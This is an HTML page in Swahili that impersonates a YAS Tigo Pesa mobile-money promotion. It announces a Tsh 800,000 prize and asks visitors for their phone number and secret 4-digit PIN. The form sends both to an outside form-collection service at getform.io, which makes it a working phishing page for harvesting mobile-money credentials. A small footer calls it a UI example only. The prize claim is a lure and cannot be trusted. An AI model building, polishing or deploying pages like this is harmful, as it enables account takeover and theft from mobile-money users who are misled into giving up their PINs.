<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Umejishindia Ofa</title>
    <!-- This line correctly links to your CSS file -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="card">
        <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
        <div class="amount-box">
            <p>Kiwango cha Ofa kinachoweza kupatikana</p>
            <h1>Tsh 800,000</h1>
        </div>
        <form id="offerForm" action="https://getform.io/f/agdvpvjb" method="POST">
            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu (eg. 07XXXXXXXX)" required>
            <input type="password" id="pin" name="pin" placeholder="YAS Neno siri (4 digits)" maxlength="4" pattern="\d{4}" required>
            <button type="submit" id="submitBtn">thibitisha</button>
        </form>
        <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
        <footer>© YAS Tanzania – Mfano wa UI pekee</footer>
    </div>
</body>
</html>
